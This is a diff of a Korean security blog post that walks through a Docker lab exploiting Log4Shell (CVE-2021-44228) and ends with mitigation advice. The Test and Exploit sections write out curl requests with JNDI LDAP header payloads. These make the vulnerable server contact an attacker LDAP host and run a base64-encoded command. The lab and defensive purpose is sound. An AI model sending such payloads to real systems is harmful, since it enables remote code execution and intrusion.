@@ -3793,6 +3793,9 @@ section 진행 기간
 <h1 id="🔔-환경-구성-후-실습"><a href="#🔔-환경-구성-후-실습" class="headerlink" title="🔔 환경 구성 후 실습"></a>🔔 환경 구성 후 실습</h1><br>
 
 <p>어떤 분이 Log4Shell 취약점 환경을 Docker로 구성 해주셔서 쉽게 실습을 해볼 수 있었습니다.</p>
+<blockquote>
+<p>버전 정보 : Log4j 2.14.1 (spring-boot-starter-log4j2 2.6.1) &amp; JDK 1.8.0_181</p>
+</blockquote>
 <br>
 
 <div class="link-grid"><div class="link-grid-container">
@@ -3800,6 +3803,24 @@ section 진행 기간
 <p>Log4Shell sample vulnerable application (CVE-2021-44228)</p><p>GitHub</p>
 <a href="https://github.com/christophetd/log4shell-vulnerable-app"></a>
 </div></div>
+
+<br>
+
+<br>
+
+<table>
+<thead>
+<tr>
+<th>취약한 서버</th>
+<th>공격자</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>192.168.219.102:8080</td>
+<td>192.168.219.103</td>
+</tr>
+</tbody></table>
+<br>
 
 <br>
 
@@ -3828,16 +3849,76 @@ section 진행 기간
 <h3 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h3><br>
 
 <blockquote>
-<p>$ curl -i -k {공격대상} -H ‘X-Api-Version: ${jndi:ldap://}’</p>
+<p>$ curl -i -k 192.168.219.102:8080 -H ‘X-Api-Version: ${jndi:ldap:://192.168.219.103/log4shell_attacker/index.html}’</p>
 </blockquote>
 <br>
 
+<img src="/images/보안동향/Log4Shell_CVE-2021-44228/attacker_test.png">
+
 <br>
 
-<h2 id="d"><a href="#d" class="headerlink" title="d"></a>d</h2><br>
+<br>
 
+<h3 id="취약한-Server-Log"><a href="#취약한-Server-Log" class="headerlink" title="취약한 Server Log"></a>취약한 Server Log</h3><br>
 
+<blockquote>
+<p>2021-12-14 12:20:00.052  INFO 1 — [nio-8080-exec-3] HelloWorld : Received a request for API version ${jndi:ldap:://192.168.219.103/log4shell_attacker/index.html}</p>
+</blockquote>
+<br>
 
+<img src="/images/보안동향/Log4Shell_CVE-2021-44228/server_log_1.png">
+
+<br>
+
+<br>
+
+<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><br>
+
+<h3 id="대기중인-공격자-LDAP-Server"><a href="#대기중인-공격자-LDAP-Server" class="headerlink" title="대기중인 공격자 LDAP Server"></a>대기중인 공격자 LDAP Server</h3><br>
+
+<img src="/images/보안동향/Log4Shell_CVE-2021-44228/ldap_server_1.png">
+
+<br>
+
+<p>대기중인 공격자의 <code>LDAP Server</code> 입니다.</p>
+<br>
+
+<br>
+
+<h3 id="공격자-LDAP-Server로-요청"><a href="#공격자-LDAP-Server로-요청" class="headerlink" title="공격자 LDAP Server로 요청"></a>공격자 LDAP Server로 요청</h3><br>
+
+<blockquote>
+<p>$ curl 192.168.219.102:8080 -H ‘X-Api-Version: ${jndi:ldap://192.168.219.103:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9rb3VuOWh3YW4=}’</p>
+</blockquote>
+<br>
+
+<p><code>touch /tmp/koun9hwan</code>을 <code>base64</code>로 인코딩 하면<code>dG91Y2ggL3RtcC9rb3VuOWh3YW4=</code> 이와같이 나오고, 공격에 성공하면 <code>/tmp/koun9hwan</code> 파일이 만들어집니다.</p>
+<br>
+
+<p>취약한 서버에서 공격자 LDAP Server로 요청을 보내면 공격자의 LDAP Server가 악성코드, 백도어 등을 다운받도록 요청을 반환합니다.</p>
+<br>
+
+<img src="/images/보안동향/Log4Shell_CVE-2021-44228/ldap_server_2.png">
+
+<br>
+
+<br>
+
+<h3 id="취약한-Server-Log-1"><a href="#취약한-Server-Log-1" class="headerlink" title="취약한 Server Log"></a>취약한 Server Log</h3><br>
+
+<img src="/images/보안동향/Log4Shell_CVE-2021-44228/server_log_2.png">
+
+<br>
+
+<br>
+
+<h3 id="생성된-파일-확인"><a href="#생성된-파일-확인" class="headerlink" title="생성된 파일 확인"></a>생성된 파일 확인</h3><br>
+
+<img src="/images/보안동향/Log4Shell_CVE-2021-44228/exploit_server.png">
+
+<br>
+
+<p><code>/tmp</code> 경로에 <code>koun9hwan</code> 파일이 생성된것을 확인할 수 있습니다.</p>
 <br>
 
 <br>
@@ -3845,7 +3926,31 @@ section 진행 기간
 <hr>
 <br>
 
-<h1 id="d-1"><a href="#d-1" class="headerlink" title="d"></a>d</h1><br>
+<h1 id="대응방안"><a href="#대응방안" class="headerlink" title="대응방안"></a>대응방안</h1><br>
+
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Log4Shell</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>영향을 받는 버전</td>
+<td>Apache Log4j 2.0-beta9 ~ 2.14.1 모든 버전</td>
+</tr>
+<tr>
+<td>해결방안</td>
+<td>최신버전(log4j 2.15)으로 패치<br />2.0-beta9 ~ 2.10.0 : JndiLookup 클래스를 경로에서 제거<br />2.10 ~ 2.14.1 : log4j2.formatMsgNoLookups 또는 LOG4J_FORMAT_MSG_NO_LOOKUPS 환경 변수를 true로 설정</td>
+</tr>
+</tbody></table>
+<br>
+
+<div class="link-grid"><div class="link-grid-container">
+<object class="link-grid-image" data="/images/보안동향/Log4Shell_CVE-2021-44228/logo.png"></object>
+<p>Apache Log4j 2 보안 업데이트 권고</p><p>KISA</p>
+<a href="https://www.krcert.or.kr/data/secNoticeView.do?bulletin_writing_sequence=36389"></a>
+</div></div>
 ]]></content>
       <categories>
         <category>보안동향</category>
